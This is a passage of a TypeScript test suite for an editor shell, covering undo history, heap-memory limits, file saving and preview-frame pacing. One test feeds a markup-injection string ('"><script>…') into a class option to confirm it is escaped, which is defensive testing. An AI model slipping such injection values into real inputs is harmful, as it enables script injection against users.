    expect(undoTexts(m.shell.adapter)).toEqual(states.slice(0, -1).map(toEditorText));
    for (let i = states.length - 2; i >= 0; i--) { expect(m.shell.undo()).toBe(true); expect(m.shell.getText()).toBe(states[i]); }
    expect(m.shell.undo()).toBe(false);
    for (let i = 1; i < states.length; i++) { expect(m.shell.redo()).toBe(true); expect(m.shell.getText()).toBe(states[i]); }
    // a new edit after undos drops the redo branch
    m.shell.undo(); m.shell.undo();
    type(m, '!');
    expect(m.shell.redo()).toBe(false);
    m.shell.undo();
    expect(m.shell.getText()).toBe(states[states.length - 3]);
    m.shell.destroy();
  });
});

// ── closed loop 2, round 2 ───────────────────────────────────────────────

/** `gc()` without the --expose-gc flag (V8 lets a running process turn it on), or null. */
function exposeGc(): (() => void) | null {
  try {
    v8.setFlagsFromString('--expose_gc');
    const gc = vm.runInNewContext('gc') as unknown;
    return typeof gc === 'function' ? (gc as () => void) : null;
  } catch {
    return null;
  }
}
const heapNow = (gc: (() => void) | null): number => { gc?.(); gc?.(); return process.memoryUsage().heapUsed; };
/** A fresh flat copy of a string (as a textarea's `value` is: no tie to the string it was built from). */
const flat = (s: string): string => Buffer.from(s, 'utf8').toString('utf8');

/** A textarea stand-in for Node: `value` is whatever the test sets, input events fire on demand. */
function fakeTextarea() {
  const ls: Record<string, Array<(e: unknown) => void>> = {};
  const ta = {
    value: '', selectionStart: 0, selectionEnd: 0, readOnly: false, className: '',
    setAttribute() {}, remove() {},
    addEventListener(t: string, f: (e: unknown) => void) { (ls[t] ??= []).push(f); },
    removeEventListener() {},
    setSelectionRange(a: number, b: number) { ta.selectionStart = a; ta.selectionEnd = b; },
    fire(t: string, e: unknown) { for (const f of ls[t] ?? []) f(e); },
  };
  const el = { ownerDocument: { createElement: () => ta }, append() {} } as unknown as EdElement;
  return { ta, el };
}

describe('memory (round 2: F4, MED3, cost-1, cost-2)', () => {
  const asciiBig = (n: number) => { let t = ''; let i = 0; while (t.length < n) t += `Paragraph ${i++} of a long document, with words enough to wrap.\n\n`; return t.slice(0, n); };

  it('[E.24] the initial and the saved text are remembered outside the window of recent texts: 17 header edits of a mixed-line-ending document undone back read exactly the original and clean; a saved text is exact after 20 more edits', () => {
    const text = '{{nyml\r\nkind: document\r\ntheme: t0\r\n}}\r\n\r\nline one\nline two\rline three\r\n';
    const m = mount({ text });
    for (let n = 1; n <= 17; n++) m.shell.setHeader({ theme: `t${n}` });
    let undos = 0;
    while (m.shell.undo()) undos++;
    expect(undos).toBe(17);
    expect(m.shell.getText()).toBe(text);
    expect(m.shell.isDirty()).toBe(false);
    // the saved text: a mixed one, saved, then 20 edits (more than the window), undone back: exact and clean
    for (let n = 1; n <= 3; n++) m.shell.setHeader({ theme: `s${n}` });
    m.shell.markSaved();
    const saved = m.shell.getText();
    expect(saved).toContain('line one\nline two\rline three');
    for (let n = 1; n <= 20; n++) m.shell.setHeader({ theme: `u${n}` });
    expect(m.shell.isDirty()).toBe(true);
    for (let n = 0; n < 20; n++) m.shell.undo();
    expect(m.shell.getText()).toBe(saved);
    expect(m.shell.isDirty()).toBe(false);
    m.shell.destroy();
    // the model itself: the initial text survives any number of adopted texts; clear() forgets everything
    const model = createTextModel('a\r\nb\nc');
    for (let i = 0; i < 40; i++) model.adopt(`x${i}\r\ny`);
    expect(model.toExact('a\nb\nc')).toBe('a\r\nb\nc');
    model.markSaved('s\rt\nu');
    for (let i = 0; i < 40; i++) model.adopt(`z${i}\n`);
    expect(model.isSaved('s\nt\nu')).toBe(true);
    expect(model.toExact('s\nt\nu')).toBe('s\rt\nu');
    model.clear();
    expect(model.toExact('a\nb\nc')).not.toBe('a\r\nb\nc');
  });

  it('[E.1] [E.2] [E.24] one editor form, two exact texts (round 3, F4): after setText of an LF text over a BOM + CR LF document with the same editor form, that editor text reads back as the LF text and dirty — right away (the window is searched before the pinned initial/saved text) and after 17 more edits undone back (the pinned text it shadowed is not found for that form any more)', () => {
    const X = '﻿A\r\nB';
    const Y = 'A\nB';
    const model = createTextModel(X);
    model.adopt(Y);
    expect([model.toExact('A\nB'), model.isSaved('A\nB'), model.bom, model.eol]).toEqual([Y, false, false, '\n']);
    expect(model.toExactOffset('A\nB', 2)).toBe(2); // Y's offsets, not X's (BOM, CR LF)
    for (let i = 0; i < 17; i++) model.adopt(`A\nB${i}`);
    expect([model.toExact('A\nB'), model.isSaved('A\nB')]).toEqual([Y, false]);
    expect(model.savedText()).toBe(X); // still the saved text; only not read back for that editor form
    // the saved text adopted again is clean again
    model.adopt(X);
    expect([model.toExact('A\nB'), model.isSaved('A\nB')]).toEqual([X, true]);
    // a save that finishes after the editor moved to another exact text of the same editor form (markSaved of the
    // text captured when the save started): the editor's text is the one given last, dirty — also after the window moves on
    const m2 = createTextModel('A\r\nB\r\n');
    m2.adopt('A\nB\n');
    m2.markSaved('A\r\nB\r\n');
    expect([m2.toExact('A\nB\n'), m2.isSaved('A\nB\n')]).toEqual(['A\nB\n', false]);
    for (let i = 0; i < 17; i++) m2.adopt(`A\nB\n${i}`);
    expect([m2.toExact('A\nB\n'), m2.isSaved('A\nB\n')]).toEqual(['A\nB\n', false]);
    // the same through the shell: setText, 17 more, undo back
    const m = mount({ text: X });
    m.shell.setText(Y);
    for (let i = 0; i < 17; i++) m.shell.setText(`A\nB${i}`);
    for (let i = 0; i < 17; i++) m.shell.undo();
    expect([m.shell.getText(), m.shell.isDirty()]).toEqual([Y, true]);
    m.shell.destroy();
  });

  it('[E.24] a remembered text costs one copy unless its line endings are mixed: 60 setText of a 1.25 MB CR LF text keep under 24 copies (they kept 32 before), and destroy() lets them go', () => {
    const gc = exposeGc();
    const crlf = asciiBig(1_250_000).replace(/\n/g, '\r\n');
    const h0 = heapNow(gc);
    const model = createTextModel(flat(crlf));
    for (let i = 0; i < 60; i++) model.adopt(flat(`${crlf.slice(0, 1000)}edit ${i}${crlf.slice(1000)}`));
    const held = (heapNow(gc) - h0) / crlf.length; // one-byte strings: bytes = characters
    model.clear();
    const after = (heapNow(gc) - h0) / crlf.length;
    expect(gc).not.toBeNull();
    expect(held).toBeLessThan(24);
    expect(held).toBeGreaterThan(10); // the measurement sees the remembered texts at all
    expect(after).toBeLessThan(3);
    // exact strings only for mixed line endings: a CR LF text reads back exactly without one
    const m2 = createTextModel('﻿a\r\nb\r\n');
    expect(m2.toExact('a\nb\n')).toBe('﻿a\r\nb\r\n');
  }, 60_000);

  it('[E.21] the textarea history keeps no whole text in its patches (V8 slices keep their parent alive): 100 steps deleting 20 characters, and 100 replacing 30, of a 1.25 MB text hold under 4 copies of it on the heap (100 before)', () => {
    const gc = exposeGc();
    const big = asciiBig(1_250_000);
    let now = 0;
    const clock = vi.spyOn(Date, 'now').mockImplementation(() => (now += 1000)); // every input its own undo step
    try {
      for (const kind of ['delete', 'replace'] as const) {
        const { ta, el } = fakeTextarea();
        const a = textareaAdapter();
        const h0 = heapNow(gc);
        a.mount(el, { doc: flat(big), onChange() {} });
        for (let i = 0; i < 100; i++) {
          const v = ta.value;
          const at = 1000 + ((i * 7919) % (v.length - 2000));
          const [to, ins, inputType] = kind === 'delete' ? [at + 20, '', 'deleteContentBackward'] : [at + 30, `replacement ${i}`, 'insertText'];
          ta.value = flat(v.slice(0, at) + ins + v.slice(to));
          ta.setSelectionRange(at + ins.length, at + ins.length);
          ta.fire('input', { inputType });
        }
        const copies = (heapNow(gc) - h0) / big.length;
        expect(gc).not.toBeNull();
        expect(copies, kind).toBeLessThan(4);
        // and the history still walks back exactly
        const steps = undoTexts(a)!;
        expect(steps).toHaveLength(100);
        expect(steps[0]).toBe(big);
        a.destroy();
      }
    } finally {
      clock.mockRestore();
    }
    // detachString makes a copy that shares nothing with its parent
    expect(detachString('x'.repeat(40))).toBe('x'.repeat(40));
    const b = `abc${'X'.repeat(29)}yz`;
    expect(minimalChange('abcdefghijklmnopqrstuvwxyz', b)).toEqual({ from: 3, to: 24, insert: b.slice(3, -2) });
  }, 120_000);

  it('[E.21] an engine taking over replays only the newest steps: undoSteps(limit) gives the text that many undos back and one forward change per step, which rebuild every text exactly', () => {
    const { ta, el } = fakeTextarea();
    const a = textareaAdapter();
    let now = 0;
    const clock = vi.spyOn(Date, 'now').mockImplementation(() => (now += 1000));
    try {
      a.mount(el, { doc: 'start\n', onChange() {} });
      for (let i = 0; i < 30; i++) {
        const v = ta.value;
        const at = (i * 5) % (v.length + 1);
        ta.value = i % 3 === 2 ? v.slice(0, Math.max(0, at - 2)) + v.slice(at) : v.slice(0, at) + `<${i}>` + v.slice(at);
        ta.setSelectionRange(0, 0);
        ta.fire('input', { inputType: i % 3 === 2 ? 'deleteContentBackward' : 'insertText' });
      }
    } finally {
      clock.mockRestore();
    }
    const texts = [...undoTexts(a)!, a.getDoc()];
    const apply = (t: string, c: { from: number; to: number; insert: string }) => t.slice(0, c.from) + c.insert + t.slice(c.to);
    for (const limit of [0, 1, 7, 30, 100]) {
      const { base, changes } = undoSteps(a, limit)!;
      const n = Math.min(limit, 30);
      expect(base).toBe(texts[30 - n]);
      expect(changes).toHaveLength(n);
      let t = base;
      changes.forEach((c, i) => { t = apply(t, c); expect(t).toBe(texts[30 - n + i + 1]); });
    }
    expect(CODEMIRROR6_HISTORY_STEPS).toBe(100);
    a.destroy();
  });
});

describe('the standalone save proves the opened file (round 2)', () => {
  it('[E.8] the standalone saver gets the opened file\'s bytes as openedHtml: by default assemble() of the text the shell was mounted with (not the edited text); an openedHtml option replaces it', async () => {
    const g = globalThis as unknown as Record<string, unknown>;
    const had = Object.prototype.hasOwnProperty.call(g, 'window');
    const prev = g.window;
    const written: string[] = [];
    const run = async (extra: Partial<EditorShellOptions>) => {
      const assembled = (t: string) => `<html>${t}</html>`;
      const assemble = vi.fn(assembled);
      const handle = {
        name: 'doc.md.html',
        getFile: async () => ({ text: async () => assembled('a\r\n') }),
        createWritable: async () => ({ write: async (h: string) => { written.push(h); }, close: async () => {} }),
      };
      g.window = { location: { protocol: 'file:', href: 'file:///d/doc.md.html', pathname: '/d/doc.md.html', origin: 'null' }, showSaveFilePicker: async () => handle };
      const m = mount({ text: 'a\r\n', assemble, fileName: 'doc.md.html', ...extra });
      type(m, 'b');
      const r = await m.shell.save();
      m.shell.destroy();
      return { r, texts: assemble.mock.calls.map((c) => c[0]) };
    };
    try {
      const plain = await run({});
      expect(plain.r).toEqual({ ok: true, via: 'file' });
      expect(plain.texts).toEqual(['a\r\nb', 'a\r\n']); // the save, then the proof of the opened file
      expect(written).toEqual(['<html>a\r\nb</html>']);
      const opened = vi.fn(() => '<html>given</html>');
      const given = await run({ openedHtml: opened });
      expect(given.r).toEqual({ ok: true, via: 'file' });
      expect(given.texts).toEqual(['a\r\nb']);
      expect(opened).toHaveBeenCalledTimes(1);
    } finally {
      if (had) g.window = prev; else delete g.window;
    }
  });

  it('[E.8] round 3 (B#6, D4): in an assembled file (standalone: true) the default opened bytes are assembled once, when the page is idle after mount — a save click then runs one assemble (none for an unchanged text) — and the includes option goes to every assemble, so a save keeps the file\'s #orz-includes', async () => {
    const g = globalThis as unknown as Record<string, unknown>;
    const had = Object.prototype.hasOwnProperty.call(g, 'window');
    const prev = g.window;
    const includes = { 'parts/a.md': 'Included A\n' };
    const assembled = (t: string, o?: { includes?: Record<string, string> }) => `<html>${t}|${JSON.stringify(o?.includes ?? null)}</html>`;
    const written: string[] = [];
    let onDisk = assembled('a\r\n', { includes });
    const handle = {
      name: 'doc.md.html',
      getFile: async () => ({ text: async () => onDisk }),
      createWritable: async () => ({ write: async (h: string) => { written.push(h); onDisk = h; }, close: async () => {} }),
    };
    g.window = { location: { protocol: 'file:', href: 'file:///d/doc.md.html', pathname: '/d/doc.md.html', origin: 'null' }, showSaveFilePicker: async () => handle };
    try {
      const assemble = vi.fn(assembled);
      const m = mount({ text: 'a\r\n', assemble, includes, fileName: 'doc.md.html', standalone: true });
      expect(assemble).not.toHaveBeenCalled(); // not during mount
      for (let i = 0; i < 60 && assemble.mock.calls.length === 0; i++) await tick(50);
      expect(assemble.mock.calls).toEqual([['a\r\n', { includes }]]); // at idle, before any save
      // an unchanged text: the save reuses it (no assemble at the click); the opened file is proved by it
      expect(await m.shell.save()).toEqual({ ok: true, via: 'file' });
      expect(assemble).toHaveBeenCalledTimes(1);
      expect(written).toEqual([assembled('a\r\n', { includes })]);
      // an edit: one assemble per click, with the includes
      type(m, 'b');
      expect(await m.shell.save()).toEqual({ ok: true, via: 'file' });
      expect(assemble.mock.calls).toEqual([['a\r\n', { includes }], ['a\r\nb', { includes }]]);
      expect(written.at(-1)).toBe(assembled('a\r\nb', { includes }));
      m.shell.destroy();
      // without includes the carrier's assemble gets the text alone (FC-19 §2's one-argument form still works)
      const plain = vi.fn(assembled);
      const n = mount({ text: 'c\n', assemble: plain, fileName: 'doc.md.html', standalone: true });
      for (let i = 0; i < 60 && plain.mock.calls.length === 0; i++) await tick(50);
      expect(plain.mock.calls).toEqual([['c\n']]);
      n.shell.destroy();
      // a shell destroyed before it is idle assembles nothing
      const none = vi.fn(assembled);
      mount({ text: 'd\n', assemble: none, standalone: true }).shell.destroy();
      await tick(2500);
      expect(none).not.toHaveBeenCalled();
    } finally {
      if (had) g.window = prev; else delete g.window;
    }
  });

  it('[E.8] round 2 of the carrier-app loop: an app\'s editor (no hooks.save, not an assembled file) assembles nothing at idle — its assemble may fetch the carrier\'s engine — only at its first save; a failed assembly of the opened bytes is not kept (the next save tries again, so the conflict check is not disabled); fileName is the picker\'s and the download\'s name', async () => {
    const g = globalThis as unknown as Record<string, unknown>;
    const had = Object.prototype.hasOwnProperty.call(g, 'window');
    const prev = g.window;
    const picked: string[] = [];
    let onDisk = '';
    const handle = { name: 'mine.md.html', getFile: async () => ({ text: async () => onDisk }), createWritable: async () => ({ write: async (h: string) => { onDisk = h; }, close: async () => {} }) };
    g.window = { location: { protocol: 'https:', href: 'https://app.test/editor', pathname: '/editor', origin: 'https://app.test' }, showSaveFilePicker: async (o: { suggestedName: string }) => { picked.push(o.suggestedName); return handle; } };
    try {
      let fail = true;
      const assemble = vi.fn(async (t: string) => { if (fail && t === 'a\n') { fail = false; throw new Error('the engine could not be fetched'); } return `<html>${t}</html>`; });
      const m = mount({ text: 'a\n', assemble, fileName: 'mine.md.html' });
      await tick(2500);
      expect(assemble).not.toHaveBeenCalled(); // not at idle
      // the first save: the opened text's assembly fails (offline) — the save fails, nothing is kept
      const r1 = await m.shell.save();
      expect(r1.ok).toBe(false);
      expect(assemble).toHaveBeenCalledTimes(1);
      // the next save assembles again, and succeeds; the picker offers fileName
      expect(await m.shell.save()).toEqual({ ok: true, via: 'file' });
      expect(assemble).toHaveBeenCalledTimes(2);
      expect(picked).toEqual(['mine.md.html']);
      expect(onDisk).toBe('<html>a\n</html>');
      m.shell.destroy();
    } finally {
      if (had) g.window = prev; else delete g.window;
    }
  });
});

describe('work in flight and after destroy (round 2: F3/#11, LOW7)', () => {
  it('[E.18] requestAi, uploadAssets and ensureUid check read-only and destroy after every wait: a proposal, an upload or a uid that arrives after setReadOnly(true) or destroy() changes nothing, and uploads stop calling the hook', async () => {
    const later = <T,>() => { let release!: (v: T) => void; const p = new Promise<T>((r) => { release = r; }); return { p, release }; };
    for (const end of ['readOnly', 'destroy'] as const) {
      const finish = (m: Mounted) => (end === 'readOnly' ? m.shell.setReadOnly(true) : m.shell.destroy());
      const ai = later<{ proposed: string }>();
      const a = mount({ text: 'a\r\nb\r\n', hooks: { ai: { operations: [{ id: 'tidy', title: 'Tidy', selection: false }], request: () => ai.p } } });
      const pa = a.shell.requestAi('tidy');
      await tick(5);
      finish(a);
      ai.release({ proposed: 'AI TEXT\n' });
      expect(await pa).toEqual({ ok: false, error: end === 'readOnly' ? 'read-only' : 'destroyed' });
      expect(a.shell.getText()).toBe('a\r\nb\r\n');
      a.shell.destroy();
      const up = later<string>();
      const uploadAsset = vi.fn(() => up.p);
      const u = mount({ text: 'a\r\nb\r\n', hooks: { uploadAsset } });
      const errors: string[] = [];
      u.shell.on('error', (e) => errors.push(e.source));
      const pu = u.shell.uploadAssets([{ name: 'x.png', type: 'image/png', size: 1 }, { name: 'y.png', type: 'image/png', size: 1 }]);
      await tick(5);
      finish(u);
      up.release('assets/x.png');
      expect(await pu).toMatchObject({ ok: false, inserted: [] });
      expect(uploadAsset).toHaveBeenCalledTimes(1); // the second file is not uploaded
      expect(u.shell.getText()).toBe('a\r\nb\r\n');
      expect(errors).toEqual([]);
      u.shell.destroy();
      const mint = later<string>();
      const d = mount({ text: '# x\n', hooks: { mintUid: () => mint.p } });
      const pd = d.shell.ensureUid();
      await tick(5);
      finish(d);
      mint.release('doc-hostminted00001');
      await expect(pd).rejects.toThrow(end === 'readOnly' ? /read-only/ : /destroyed/);
      expect(d.shell.getText()).toBe('# x\n');
      d.shell.destroy();
    }
  });

  it('[E.18] ensureUid: a uid set while the host mints one wins — it is returned and the minted one is not written', async () => {
    let release!: (v: string) => void;
    const m = mount({ text: '# x\n', hooks: { mintUid: () => new Promise<string>((r) => { release = r; }) } });
    const p = m.shell.ensureUid();
    await tick(5);
    m.shell.setHeader({ uid: UID_B });
    release('doc-hostminted00001');
    expect(await p).toBe(UID_B);
    expect(m.shell.getText()).toContain(`uid: ${UID_B}`);
    expect(m.shell.getText()).not.toContain('doc-hostminted00001');
    m.shell.destroy();
  });

  it('[E.7] after destroy(): getText() is the text as it was, setText/setHeader/markSaved/undo do nothing, and a save hook that finishes later posts nothing to the host (no dirty message, no event)', async () => {
    let release!: () => void;
    const dirtyPosts: boolean[] = [];
    const host = { connected: () => true, setDirty: (d: boolean) => { dirtyPosts.push(d); } } as unknown as HostConnection;
    const m = mount({ text: 'a\r\n', host, hooks: { save: () => new Promise<void>((r) => { release = r; }) } });
    type(m, 'b');
    expect(dirtyPosts).toEqual([true]);
    const events: string[] = [];
    m.shell.on('save', () => events.push('save'));
    m.shell.on('dirty', () => events.push('dirty'));
    const saving = m.shell.save();
    await tick(5);
    m.shell.destroy();
    release();
    await saving;
    expect(dirtyPosts).toEqual([true]);
    expect(events).toEqual([]);
    expect(m.shell.getText()).toBe('a\r\nb');
    m.shell.setText('other');
    m.shell.setHeader({ title: 'x' });
    m.shell.markSaved();
    expect([m.shell.undo(), m.shell.redo(), m.shell.getText(), m.shell.isDirty()]).toEqual([false, false, 'a\r\nb', true]);
  });
});

/**
 * The DOM interfaces the default bridge captures at start (2.3.0 round 3, E.35), for running it in a bare vm
 * context: prototypes with the getters and methods it takes, an event's own `isTrusted`, and `addEventListener`
 * on EventTarget.prototype (calling `add(type, listener)` for the window and the document).
 */
function bridgeDomStubs(add: (type: string, listener: (e: unknown) => void, target?: unknown) => void): Record<string, unknown> {
  class EventTarget { addEventListener(t: string, l: (e: unknown) => void) { add(t, l, this); } }
  class Event {
    _i: Record<string, unknown>;
    constructor(init: Record<string, unknown> | string = {}) { this._i = typeof init === 'string' ? {} : init; Object.defineProperty(this, 'isTrusted', { get() { return (this as Event)._i.trusted === true; } }); }
    get target() { return this._i.target ?? null; }
    get defaultPrevented() { return this._i.prevented === true; }
    preventDefault() { this._i.prevented = true; }
    stopImmediatePropagation() {}
  }
  class MessageEvent extends Event {
    get data() { return this._i.data; }
    get source() { return this._i.source ?? null; }
    get ports() { return this._i.ports ?? []; }
  }
  class KeyboardEvent extends Event {}
  for (const k of ['key', 'metaKey', 'ctrlKey', 'altKey', 'shiftKey']) Object.defineProperty(KeyboardEvent.prototype, k, { get() { return (this as Event)._i[k]; }, configurable: true });
  class MouseEvent extends Event { get buttons() { return this._i.buttons ?? 0; } }
  class Element { closest() { return null; } getAttribute() { return null; } }
  return { EventTarget, Event, MessageEvent, KeyboardEvent, MouseEvent, Element, addEventListener: EventTarget.prototype.addEventListener };
}

describe('preview pacing, navigation, channel (round 2: B#3, LOW6, B#4, B#8)', () => {
  it('[E.16] a render runs until the frame acknowledges it (orz-preview-rendered with its id) and the pause counts the frame\'s time: with a frame that takes 200 ms, a keystroke every 30 ms renders a few times, never two at once in the frame', async () => {
    const m = mount({ render: (t) => `<p>${t.length}</p>`, preview: { assets: false, debounceMs: 10 } });
    const f = frameOf(m);
    let inFrame = 0;
    let most = 0;
    let renders = 0;
    const cw = m.root.querySelector('iframe')!.contentWindow as unknown as { postMessage(x: Record<string, unknown>): void };
    cw.postMessage = (msg: Record<string, unknown>) => {
      if (msg.type !== 'orz-preview-render') return;
      renders++;
      inFrame++;
      most = Math.max(most, inFrame);
      setTimeout(() => { inFrame--; f.say({ type: 'orz-preview-rendered', id: msg.id, anchors: [], max: 0 }); }, 200);
    };
    f.say({ type: 'orz-preview-ready' });
    await tick(300);
    const before = renders;
    for (let i = 0; i < 50; i++) { type(m, 'x'); await tick(30); } // 1.5 s of typing
    await tick(1200);
    const during = renders - before;
    expect(most).toBe(1);
    expect(during).toBeGreaterThanOrEqual(2); // and the preview does not wait for the typing to stop (LOW6)
    expect(during).toBeLessThanOrEqual(5); // without the frame's time it rendered after almost every key
    m.shell.destroy();
  });

  it('[E.16] an acknowledgement of an earlier render id does not count (round 3, m15): a frame that answers each render at once with a stale id and with the right one 200 ms later never holds two renders at once', async () => {
    const m = mount({ render: (t) => `<p>${t.length}</p>`, preview: { assets: false, debounceMs: 10 } });
    const f = frameOf(m);
    let inFrame = 0;
    let most = 0;
    let renders = 0;
    const cw = m.root.querySelector('iframe')!.contentWindow as unknown as { postMessage(x: Record<string, unknown>): void };
    cw.postMessage = (msg: Record<string, unknown>) => {
      if (msg.type !== 'orz-preview-render') return;
      renders++;
      inFrame++;
      most = Math.max(most, inFrame);
      f.say({ type: 'orz-preview-rendered', id: (msg.id as number) - 1, anchors: [], max: 0 }); // a late answer to the previous render
      setTimeout(() => { inFrame--; f.say({ type: 'orz-preview-rendered', id: msg.id, anchors: [], max: 0 }); }, 200);
    };
    f.say({ type: 'orz-preview-ready' });
    await tick(300);
    const before = renders;
    for (let i = 0; i < 40; i++) { type(m, 'x'); await tick(30); }
    await tick(1200);
    expect(renders - before).toBeGreaterThanOrEqual(2);
    expect(most).toBe(1);
    m.shell.destroy();
  });

  it('[E.16] while edits continue, a render runs at least every max(1000 ms, 4 × the last render): 2.4 s of keystrokes every 60 ms (under the 150 ms pause) render during the typing', async () => {
    const render = vi.fn((t: string) => `<p>${t.length}</p>`);
    const m = mount({ render, preview: { assets: false, debounceMs: 150 } });
    frameOf(m).say({ type: 'orz-preview-ready' });
    await tick(250);
    const before = render.mock.calls.length;
    for (let i = 0; i < 40; i++) { type(m, 'k'); await tick(60); }
    const during = render.mock.calls.length - before;
    expect(during).toBeGreaterThanOrEqual(2);
    expect(during).toBeLessThanOrEqual(4);
    m.shell.destroy();
  });

  it('[E.32] preview.maxWaitMs: Infinity (2.3.0, a kind whose render blocks the page): 2.4 s of keystrokes every 60 ms render nothing while they arrive, then exactly one render of the latest text after the pause; default and finite values still force renders', async () => {
    const run = async (maxWaitMs?: number): Promise<{ during: number; after: number; last: string }> => {
      const render = vi.fn((t: string) => `<p>${t.length}</p>`);
      const m = mount({ render, preview: { assets: false, debounceMs: 150, ...(maxWaitMs !== undefined ? { maxWaitMs } : {}) } });
      frameOf(m).say({ type: 'orz-preview-ready' });
      await tick(250);
      const before = render.mock.calls.length;
      for (let i = 0; i < 40; i++) { type(m, 'k'); await tick(60); }
      const during = render.mock.calls.length - before;
      await tick(400);
      const after = render.mock.calls.length - before - during;
      const last = String(render.mock.calls.at(-1)?.[0]);
      const text = m.shell.getText();
      m.shell.destroy();
      expect(last).toBe(text);
      return { during, after, last };
    };
    const never = await run(Infinity);
    expect(never.during).toBe(0);
    expect(never.after).toBe(1);
    expect((await run()).during).toBeGreaterThanOrEqual(2); // default unchanged (E.16)
    expect((await run(500)).during).toBeGreaterThanOrEqual(3); // a finite value forces renders that often
  });

  it('[E.32] [E.16] with maxWaitMs: Infinity the frame-acknowledged pacing holds: a frame that takes 200 ms grows the pause to 400 ms, so keystrokes every 300 ms render nothing (default: renders forced about once a second), never two renders in the frame at once, and the pause renders once', async () => {
    const run = async (maxWaitMs?: number): Promise<{ during: number; after: number; most: number; keys: number }> => {
      const m = mount({ render: (t) => `<p>${t.length}</p>`, preview: { assets: false, debounceMs: 10, ...(maxWaitMs !== undefined ? { maxWaitMs } : {}) } });
      const f = frameOf(m);
      let inFrame = 0;
      let most = 0;
      let renders = 0;
      const cw = m.root.querySelector('iframe')!.contentWindow as unknown as { postMessage(x: Record<string, unknown>): void };
      cw.postMessage = (msg: Record<string, unknown>) => {
        if (msg.type !== 'orz-preview-render') return;
        renders++;
        inFrame++;
        most = Math.max(most, inFrame);
        setTimeout(() => { inFrame--; f.say({ type: 'orz-preview-rendered', id: msg.id, anchors: [], max: 0 }); }, 200);
      };
      f.say({ type: 'orz-preview-ready' });
      await tick(400); // the first render: the frame's 200 ms is now the last render's time
      const before = renders;
      const keys = 12;
      for (let i = 0; i < keys; i++) { type(m, 'x'); await tick(300); }
      const during = renders - before;
      await tick(900);
      const after = renders - before - during;
      m.shell.destroy();
      return { during, after, most, keys };
    };
    const paced = await run(Infinity);
    expect(paced.during / paced.keys).toBe(0);
    expect(paced.after).toBe(1);
    expect(paced.most).toBe(1);
    const forced = await run();
    expect(forced.during).toBeGreaterThanOrEqual(2);
    expect(forced.most).toBe(1);
  });

  it('[E.15] in navigate mode a view change that shows the preview posts the caret\'s line (again once the preview has rendered)', async () => {
    const m = mount({ text: 'a\nb\nc\nd\ne\nf\n', mode: 'editor', preview: { assets: false, debounceMs: 5, mode: 'navigate' } });
    const f = frameOf(m);
    f.say({ type: 'orz-preview-ready' });
    m.ta().setSelectionRange(8, 8); // line 4
    m.shell.setMode('preview');
    expect(f.posted.filter((x) => x.type === 'orz-preview-navigate').at(-1)).toEqual({ type: 'orz-preview-navigate', line: 4 });
    await tick(30);
    const r = f.posted.find((x) => x.type === 'orz-preview-render')!;
    const n = f.posted.length;
    f.say({ type: 'orz-preview-rendered', id: r.id, anchors: [], max: 0 });
    expect(f.posted.slice(n)).toContainEqual({ type: 'orz-preview-navigate', line: 4 });
    m.shell.setMode('editor');
    m.ta().setSelectionRange(2, 2);
    m.shell.setMode('split');
    expect(f.posted.filter((x) => x.type === 'orz-preview-navigate').at(-1)).toEqual({ type: 'orz-preview-navigate', line: 1 });
    m.shell.destroy();
  });

  it('[E.25] shell.preview: post() reaches the frame (only once ready), on(type) hears the frame\'s messages of that type, setOptions({ head, scheme }) rebuilds the frame document and shows the last HTML again on the new ready', async () => {
    const m = mount({ render: () => '<p>x</p>' });
    const f = frameOf(m);
    expect(m.shell.preview.post({ type: 'x-slides-go', delta: 1 })).toBe(false);
    f.say({ type: 'orz-preview-ready' });
    await tick(30);
    expect(m.shell.preview.post({ type: 'x-slides-go', delta: 1 })).toBe(true);
    expect(f.posted.at(-1)).toEqual({ type: 'x-slides-go', delta: 1 });
    const heard: unknown[] = [];
    const off = m.shell.preview.on('x-slides-at', (msg) => heard.push(msg.index));
    f.say({ type: 'x-slides-at', index: 3 });
    f.say({ type: 'other', index: 9 });
    off();
    f.say({ type: 'x-slides-at', index: 4 });
    expect(heard).toEqual([3]);
    const before = m.root.querySelector('iframe')!;
    m.shell.preview.setOptions({ head: '<link rel="stylesheet" href="theme-2.css">', scheme: 'dark' });
    // (2.5.0, D-100) the frame that shows the document stays, inert, over the rebuilt one until that one has drawn it
    const frames = [...m.root.querySelectorAll('iframe')];
    expect(frames.length).toBe(2);
    expect([frames[0] === before, before.getAttribute('aria-hidden'), (before as unknown as { inert: boolean }).inert, before.style.position]).toEqual([true, 'true', true, 'absolute']);
    const iframe = frames[1];
    expect(iframe.getAttribute('sandbox')).toBe('allow-scripts');
    expect(iframe.srcdoc).toContain('href="theme-2.css"');
    expect(iframe.srcdoc).toContain('data-scheme="dark"');
    expect(m.shell.preview.post({ type: 'x' })).toBe(false); // reloading
    const f2 = frameOf(m);
    f2.say({ type: 'orz-preview-ready' });
    expect(f2.posted).toContainEqual(expect.objectContaining({ type: 'orz-preview-render', html: '<p>x</p>' }));
    m.shell.destroy();
    expect(m.shell.preview.post({ type: 'x' })).toBe(false);
  });

  it('[E.25] (2.2.0) shell.preview.setOptions({ articleClass }) changes the frame\'s article class (a measure change), keeping head and scheme; the frame shows the last HTML again', async () => {
    const m = mount({ render: () => '<p>x</p>', preview: { articleClass: 'markdown-body', head: '<link rel="stylesheet" href="t.css">', debounceMs: 10 } });
    const f = frameOf(m);
    f.say({ type: 'orz-preview-ready' });
    await tick(30);
    const live = () => [...m.root.querySelectorAll('iframe')].at(-1)!;
    m.shell.preview.setOptions({ articleClass: 'markdown-body measure-wide' });
    expect(live().srcdoc).toContain('<article class="markdown-body measure-wide" id="orz-doc">');
    expect(live().srcdoc).toContain('href="t.css"');
    m.shell.preview.setOptions({ articleClass: '"><script>x</script>' });
    // a rebuild while the last one still loads replaces that one; the picture stays (one picture, one live frame)
    expect(m.root.querySelectorAll('iframe').length).toBe(2);
    expect(live().srcdoc).toContain('<article class="&quot;&gt;&lt;script&gt;x&lt;/script&gt;" id="orz-doc">');
    const f2 = frameOf(m);
    f2.say({ type: 'orz-preview-ready' });
    expect(f2.posted).toContainEqual(expect.objectContaining({ type: 'orz-preview-render', html: '<p>x</p>' }));
    m.shell.destroy();
  });

  it('[E.25] the default bridge goes before every stylesheet and finds #orz-doc when a render arrives; it calls the page hooks __orzPreviewApply / __orzPreviewNavigate / __orzPreviewMessage and exposes __orzPreview.report; a carrier\'s own bridge keeps its place after the article', () => {
    const full = previewFrameDocument({ head: '<link rel="stylesheet" href="slow.css">' });
    const bridgeAt = full.indexOf(PREVIEW_BRIDGE);
    expect(bridgeAt).toBeGreaterThan(0);
    expect(bridgeAt).toBeLessThan(full.indexOf('<link'));
